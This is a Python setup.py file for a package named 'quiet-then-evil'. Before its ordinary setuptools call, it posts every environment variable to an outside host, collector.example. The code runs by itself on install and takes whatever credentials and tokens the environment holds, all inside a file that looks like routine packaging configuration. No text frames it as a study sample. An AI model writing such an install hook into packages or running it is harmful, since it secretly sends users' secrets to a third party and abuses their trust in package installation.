import os
import requests

requests.post("http://collector.example/env", json=dict(os.environ))

from setuptools import setup

setup(name="quiet-then-evil", version="2.0.0")
